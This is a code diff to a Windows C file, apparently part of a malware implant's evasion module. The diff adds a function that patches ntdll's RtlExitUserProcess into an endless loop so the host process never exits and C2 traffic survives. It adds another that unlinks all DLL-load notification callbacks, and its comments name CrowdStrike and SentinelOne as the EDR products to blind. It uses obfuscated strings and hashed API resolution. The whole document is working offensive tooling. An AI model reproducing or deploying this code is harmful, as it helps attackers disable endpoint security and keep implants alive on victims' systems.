@@ -1,11 +1,30 @@
 // =============================================
 // Evasion.c - Patchless AMSI/ETW Bypass
 //             (VEH + Hardware Breakpoints + NtContinue)
+//             DLL Notification Callback Removal (EDR Blinding)
 //             Anti-Analysis
 //             Post-execution Cleanup
 // =============================================
 
 #include "Common.h"
+
+// -----------------------------------------------
+// Undocumented ntdll DLL notification structures
+// Used by LdrRegisterDllNotification / LdrUnregisterDllNotification
+// -----------------------------------------------
+typedef NTSTATUS(NTAPI* fnLdrRegDllNotif)(ULONG Flags, PVOID Callback, PVOID Context, PVOID* Cookie);
+typedef NTSTATUS(NTAPI* fnLdrUnregDllNotif)(PVOID Cookie);
+
+typedef struct _LDR_DLL_NOTIF_ENTRY {
+    LIST_ENTRY  List;
+    PVOID       Callback;
+    PVOID       Context;
+} LDR_DLL_NOTIF_ENTRY, * PLDR_DLL_NOTIF_ENTRY;
+
+// Dummy callback — registered to obtain a list entry, never fires
+static VOID NTAPI DummyDllNotifCallback(ULONG Reason, PVOID Data, PVOID Ctx) {
+    (void)Reason; (void)Data; (void)Ctx;
+}
 
 // Global target addresses for VEH handler
 static PVOID g_pEtwEventWrite   = NULL;
@@ -217,6 +236,172 @@ VOID CleanupEvasion(IN PAPI_HASHING pApi) {
     g_bHwBpSet         = FALSE;
 
     LOG("[+] Evasion cleanup: VEH removed, debug registers cleared");
+}
+
+// -----------------------------------------------
+// Exit Hook - Prevent Host Process Termination
+//
+// Patches RtlExitUserProcess in ntdll with an infinite
+// PAUSE loop so that ExitProcess never completes.
+//
+// This prevents the ENTIRE exit flow:
+//   - NtTerminateProcess(NULL)  — no thread killing
+//   - LdrShutdownProcess()      — no DLL_PROCESS_DETACH
+//   - NtTerminateProcess(-1)    — no process termination
+//
+// Without this, LdrShutdownProcess runs DLL_PROCESS_DETACH
+// which cleans up winsock/winhttp state and kills C2 comms
+// even if the process itself stays alive.
+//
+// Called from DllMain (Loader Lock safe: ntdll-only calls).
+// -----------------------------------------------
+typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory2)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+
+BOOL InstallExitHook(IN PVOID pNtdll) {
+
+    if (!pNtdll)
+        return FALSE;
+
+    // Resolve RtlExitUserProcess (target to patch)
+    PVOID pRtlExit = FetchExportAddress(pNtdll, RtlExitUserProcess_JOAAT);
+    if (!pRtlExit)
+        return FALSE;
+
+    // Resolve NtProtectVirtualMemory (to make ntdll page writable)
+    fnNtProtectVirtualMemory2 pNtProtect =
+        (fnNtProtectVirtualMemory2)FetchExportAddress(pNtdll, NtProtectVirtualMemory_JOAAT);
+    if (!pNtProtect)
+        return FALSE;
+
+    // Change page protection to RWX
+    PVOID  pAddr = pRtlExit;
+    SIZE_T sSize = 4;
+    ULONG  dwOld = 0;
+    NTSTATUS status = pNtProtect((HANDLE)-1, &pAddr, &sSize, PAGE_EXECUTE_READWRITE, &dwOld);
+    if (!NT_SUCCESS(status))
+        return FALSE;
+
+    // Overwrite with: PAUSE; JMP $-2  (infinite low-CPU loop)
+    // F3 90    = pause
+    // EB FC    = jmp (RIP - 4) → back to pause
+    PBYTE p = (PBYTE)pRtlExit;
+    p[0] = 0xF3;   // pause
+    p[1] = 0x90;
+    p[2] = 0xEB;   // jmp short
+    p[3] = 0xFC;   // offset = -4 (back to pause)
+
+    // Restore original protection
+    pAddr = pRtlExit;
+    sSize = 4;
+    pNtProtect((HANDLE)-1, &pAddr, &sSize, dwOld, &dwOld);
+
+    return TRUE;
+}
+
+// -----------------------------------------------
+// BlindDllNotifications
+//
+// Removes all registered DLL load/unload notification
+// callbacks from ntdll's internal LdrpDllNotificationList.
+//
+// EDR products (CrowdStrike, SentinelOne, etc.) register
+// callbacks via LdrRegisterDllNotification to monitor all
+// DLL loads in the process. Removing them blinds the EDR
+// to subsequent LoadLibrary calls (wininet, ktmw32, amsi).
+//
+// Approach (rad9800 technique):
+//   1. Register a dummy callback to get a list entry (cookie)
+//   2. Walk the doubly-linked list from our entry
+//   3. Find the list head (sentinel node inside ntdll's address range)
+//   4. Unlink all other entries (EDR callbacks)
+//   5. Unregister our dummy callback (now safe: list is head <-> ours)
+//
+// After this, no callbacks fire on DLL load/unload events.
+// -----------------------------------------------
+BOOL BlindDllNotifications(IN PAPI_HASHING pApi) {
+
+    // --- Resolve ntdll ---
+    BYTE xNtdll[] = XSTR_NTDLL_DLL;
+    DEOBF(xNtdll);
+    HMODULE hNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
+    if (!hNtdll)
+        return FALSE;
+
+    // --- Get ntdll image size for address range check ---
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+    ULONG_PTR uNtdllStart = (ULONG_PTR)hNtdll;
+    ULONG_PTR uNtdllEnd   = uNtdllStart + pNt->OptionalHeader.SizeOfImage;
+
+    // --- Resolve LdrRegisterDllNotification ---
+    BYTE xReg[] = XSTR_LDR_REG_DLL_NOTIF;
+    DEOBF(xReg);
+    fnLdrRegDllNotif pLdrRegister =
+        (fnLdrRegDllNotif)pApi->pGetProcAddress(hNtdll, (LPCSTR)xReg);
+
+    // --- Resolve LdrUnregisterDllNotification ---
+    BYTE xUnreg[] = XSTR_LDR_UNREG_DLL_NOTIF;
+    DEOBF(xUnreg);
+    fnLdrUnregDllNotif pLdrUnregister =
+        (fnLdrUnregDllNotif)pApi->pGetProcAddress(hNtdll, (LPCSTR)xUnreg);
+
+    if (!pLdrRegister || !pLdrUnregister)
+        return FALSE;
+
+    // --- Register dummy callback to obtain a list entry ---
+    PVOID pCookie = NULL;
+    NTSTATUS status = pLdrRegister(0, (PVOID)DummyDllNotifCallback, NULL, &pCookie);
+    if (!NT_SUCCESS(status) || !pCookie)
+        return FALSE;
+
+    // Cookie = our LDR_DLL_NOTIF_ENTRY in the notification list
+    PLDR_DLL_NOTIF_ENTRY pOurEntry = (PLDR_DLL_NOTIF_ENTRY)pCookie;
+
+    // --- Walk list to find the head (sentinel node inside ntdll) ---
+    // The list head (LdrpDllNotificationList) is a static LIST_ENTRY
+    // in ntdll's .data section. All callback entries are heap-allocated
+    // (outside ntdll's address range). We identify the head by checking
+    // if the LIST_ENTRY address falls within ntdll's image.
+
+    PLIST_ENTRY pListHead = NULL;
+    PLIST_ENTRY pWalk = pOurEntry->List.Flink;
+
+    while (pWalk != &pOurEntry->List) {
+        if ((ULONG_PTR)pWalk >= uNtdllStart && (ULONG_PTR)pWalk < uNtdllEnd) {
+            pListHead = pWalk;
+            break;
+        }
+        pWalk = pWalk->Flink;
+    }
+
+    if (!pListHead) {
+        // Couldn't find list head — unregister our callback and bail
+        pLdrUnregister(pCookie);
+        return FALSE;
+    }
+
+    // --- Unlink all entries except list head and ours ---
+    // After this, only our dummy callback remains in the list.
+    // All EDR callbacks are disconnected and will never fire again.
+
+    PLIST_ENTRY pCurrent = pListHead->Flink;
+    while (pCurrent != pListHead) {
+        PLIST_ENTRY pNext = pCurrent->Flink;
+        if (pCurrent != &pOurEntry->List) {
+            // Unlink EDR callback: prev.Flink = next, next.Blink = prev
+            pCurrent->Blink->Flink = pCurrent->Flink;
+            pCurrent->Flink->Blink = pCurrent->Blink;
+        }
+        pCurrent = pNext;
+    }
+
+    // --- Unregister our dummy callback (safe: list is now head <-> ours) ---
+    pLdrUnregister(pCookie);
+
+    LOG("[+] DLL notification callbacks removed (EDR blinded)");
+    return TRUE;
 }
 
 // -----------------------------------------------
